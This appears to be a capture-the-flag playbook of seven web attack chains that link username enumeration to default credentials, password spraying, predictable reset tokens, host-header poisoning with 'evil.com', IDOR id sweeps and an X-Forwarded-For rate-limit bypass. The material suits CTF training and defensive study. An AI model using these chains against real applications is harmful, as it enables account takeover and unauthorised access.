# Multi-step chains (deep) — enum as link 1, fully worked

## Chain 1: direct-oracle → seeded list → default credential → flag

```
GET /api/username-available?u=  (direct oracle, unauth)
  -> seeded list: admin/service/backup/flag confirmed
  -> admin:admin  ->  a session  ->  /admin -> the flag
```

Every step cheap — the whole solve is the oracle + the default cred.

## Chain 2: bcrypt-timing → confirmed service → predictable reset → flag

```
POST /api/login  ->  {"error":"invalid"} both, timing gap 247ms vs 8ms
  -> service confirmed via timing
  -> POST /reset -> a predictable token (a md5(time) / a 6-digit)
     -> web-auth-session's reset-token surface
  -> POST /reset/confirm -> password reset -> login -> the flag
```

## Chain 3: register-taken → confirmed ci → spray → flag

```
POST /register -> "username already taken" for admin
  -> register oracle -> admin, root, ci confirmed
  -> spray Password1 across the confirmed accounts
     (under the per-account lock of 5)
  -> ci:Password1 -> a session -> web-auth-session
```

## Chain 4: reset-send → confirmed admin → host-header poison → flag

```
POST /forgot-password -> {"emails_queued":1} for admin, 0 for fake
  -> admin confirmed via the send-field
  -> POST /forgot-password -H 'Host: evil.com' -> the reset link's host
     is the attacker's (web-host-header)
  -> the victim clicks / or the token leaks -> reset -> the flag
```

## Chain 5: lockout-oracle → confirmed names → spray-under → flag

```
POST /login -> 423 "locked" on admin at 6, "invalid" on fake at 20
  -> lockout oracle -> admin, backup, deploy confirmed
  -> per-account lock -> one password per account (spray pattern)
  -> backup:backup123 -> a session -> the flag
```

## Chain 6: REST-oracle → id sweep → admin object → flag

```
GET /api/users/{id} -> 200 for real, 404 for fake
  -> the existence oracle + web-idor
  -> an id sweep (1..1000) -> the account list + each object
  -> admin's object carries a flag field / a role -> the flag
```

## Chain 7: throttle-bypass → spray → flag

```
POST /login -> a text oracle + a per-IP 429 at 8
  -> X-Forwarded-For:<rand> resets the 429 -> the bypass
  -> a spray across enum'd accounts under the bypass
  -> service:letmein -> a session -> the flag
```

## The chain grammar

```
enum(oracle) -> verified(name) -> neighbor(class, payload) -> flag
```

The enum's edge is `verified(name)` — the confirmed account. Every
downstream step is the neighbor class's; the chain card names the class
that closed the flag, with `web-user-enum` as the recon that surfaced
the target.
